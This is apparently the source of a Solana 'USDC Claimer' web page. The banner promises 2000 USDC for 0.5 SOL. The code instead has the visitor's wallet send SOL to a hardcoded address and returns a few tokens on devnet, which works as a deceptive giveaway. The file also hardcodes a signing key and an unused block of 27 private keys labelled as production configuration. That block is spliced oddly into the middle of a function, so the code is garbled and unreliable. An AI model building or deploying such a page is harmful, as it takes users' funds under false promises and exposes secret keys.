/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "fitiJZcTVuAzdpYyRiJRPtLYc2kn7SrTRZiy2asYtWXVXHcrxYQE77thQy4Cb5UDkxEdfSpEJhFGitczCA7extk"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5z3n9kPifnfCavq41p8Y1vfZMxarnR6pL9Q1eoj2V14kuivxJabSRw1YLUv1oE1JSCqEcZPzoUhBF7uTj6M1811N",
  "key1": "5eeJjvZA24H9HoihQuwtGLGR8F53sNMUawC2uzy7NHUFSNAfhRWFpB5MH1EcLvGhawX6nXnMhiARAXT7z7hgqqHw",
  "key2": "3vkLeumwsGKavbREVKviUao9WKjbwevRb7AxQWRJpYxM1AqzLRyC2LsPK6roSKUjLw5iYV3xcruJTm3SBbqYamH8",
  "key3": "4UEpH3NBKvtKdvHENsFAffvsxSv5CRGggbrhiYnZ5dWMmNPJ9NCmxKUbHRkeZP51ZS2dKFAivTnXEYbHHun1hsH9",
  "key4": "5kMJZoHCgB5zBjQavrok3Y8c8wfPSUxS1YQRKsqNZjimhNjCFcpaMCQC3nAXrtbG3ivLzHDQUvSunppojHVWWKmu",
  "key5": "4b5ABNpiHnhdWPzcLfTxHcxq3Mgj5Hnm48RmobP55RfPcjUCkXEXaTEH5AkKcqW3RrTgiiPZHd2diJDmKfkeE1jA",
  "key6": "4UvVLcKNMpXuP1iupSV3Rg7sUdUihL87iCBDiohqEfAR5PrmbH47FxUr9tu2tBTPpJxeu9UJjEzEAroNbGgTFcr6",
  "key7": "3FgnWVfa9BBjFCthAKb1z8nhPkmsudSVRNvrw6cjpYxn2jKapJAqxx86gzzTGqH9nXDpH3hXtTmVi76yMFKkLVMz",
  "key8": "2MWHBDvfkYKkR3MtXEaEtpbsyVv5bd1SsdM2DQKdxyH3XaMWc4aJwnUsLdCcxmctiqv6mJp4VuiQPoHAr7cnNw3o",
  "key9": "3jFCxJBRMkLC6ryMYYjQfMqxFxkHWDrPk1vbh6zzcNc7nACxJeLEBiE395bSogAWSDvHbYzApHBZxMxpJYDaB7Nt",
  "key10": "3Ake4Mcm865gDaDYGH9VfTM9nxqDKjqhr7Sgj72BeTp51Er6FYn1eecXpg6yRcQvzrrPTwsL9YhLm3QRs2yU3Suk",
  "key11": "2hvBi38BDHCrRW1yJMzURwmHRttNTittN6SDaKKGuc47bKymPpX2SHLAzV44hjLfwZFrTsB7N2e6ZWDuWEQ7JtsM",
  "key12": "monG6oPio3Y3nYXFvJo9eTy4AN96uogsV1Px35HfaEzRsi3LmiWw1XnA2Egh5tKMAn35Y4PSSc9cfdmLcMHvDkG",
  "key13": "5WzZCxqc5fFP1q19cRpADH1T8qcXJ7K6anNvs8JmJGKgXTvHAwNpQ4o9PbnhyU2XvhKdxFEmvR6HKuj5JwV7CqN4",
  "key14": "C8oEAWakAgPW4RTDoSkZkXQH5kBnaRRs2tTeNLfQ7NsxaSJKhwbzKjqiDFsfukHxLfKPpDAUN1W9pijPUM8qh2n",
  "key15": "6iQqoJqjfSjG8swCMECBUKLCKYUmkSTvrYc8eKWhkJqEEGfVavNMGHrUqeadLoHDFtPGLi4GeVAz2RVuf3c8RfC",
  "key16": "3XbX3UzQQnEkLNvJw19CC5Uu2Ma8JV4MsZCUQ5FBUPYYUGaf5rSPttNJzcTxWoEJ3dP8mCcL23ziaf7boPNmZnmB",
  "key17": "6yEzAookFBStEp355aoENuvhvWN3a7HhKvBgoo815qMx1rbVmHF77C78zWxtmdfpgLNEDB93MNEWFCZrdWUo854",
  "key18": "2jM26Vwg24QdFRnpdXSaePKB4dQkw6mbqg7McD9xwZfAhZfCmLdg2ivfbx38mYXG8jKtBLQqbrrfF5i443ExZWfg",
  "key19": "437FWorvwZZSzFL3RW92CW6RNo2AR42ch11CbjmPentCvBcjS84DyFGSqWMvX2ozsJ1FrdssNEU476K6Vjwk8VTi",
  "key20": "2bBLJ6Yj1usZwGeLVuUbT4815fMAxErQUrsavKmpyR6vrhpzwFVJ7emCP8UHYTnU5nPbygD6Pp7pTQp37Tksn9xK",
  "key21": "DZgfQxxiuNihQdTGPS19N1PuAQ87F8CH4nvSpyn845tVXomc4hFBDDM3FBFVTSQnZkTJam4CKX1gyuSBWtZakK5",
  "key22": "2Dqotj4YgUKoSpxWm2oAmqxHTEnvcs8weDMQ3DCQkWLVHEsBbcVpfVWaLr1r6dTPkb6938F8owAJQBfaG1X212p4",
  "key23": "3qLe5hAzL98nKHhUyjR4P5arcZGcTfQ3XsDTKMzhEVeJvu76hJTkHbVn1zUjF7AQYfkMbXm7VqBuUdEcchRr8erN",
  "key24": "3doh1yM8skRrybtLsA4fSFX4vjqQRzd7xeKCWgxmCEMxX6aHyk8xsahTciAQE1owerWhijndbccCWg2DZVfZShUD",
  "key25": "2FPUJibM1tmJV7Aa6Y3iJ35kZCcFbk37hDzM2rAvQSV415ZxevZURcvE2SXBDXGyRa3sWKmGXFX6vx2B18784gGm",
  "key26": "36PPTnY71eEhBGXgqvFBRxSTYkQj8F5waFQ3MyWy2PL5eEB36LLWGJRSDDL9MPANUAQuLTBiSjhmbjx2hFepwcH8"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
